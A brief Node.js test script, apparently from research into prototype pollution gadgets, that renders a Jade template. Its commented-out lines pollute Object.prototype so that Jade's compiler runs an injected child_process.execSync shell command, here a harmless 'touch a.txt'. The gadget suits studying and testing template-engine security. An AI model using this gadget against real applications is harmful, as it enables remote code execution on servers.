var jade = require('jade');

// Object.prototype.compileDebug = 1;
// Object.prototype.self = 1;
// Object.prototype.line = "console.log(global.process.mainModule.require('child_process').execSync('touch a.txt'))"

// for node-find-undefined
console.log("===========start===========")

jade.renderFile('index.jade');

// for node-find-undefined
console.log("===========start===========")
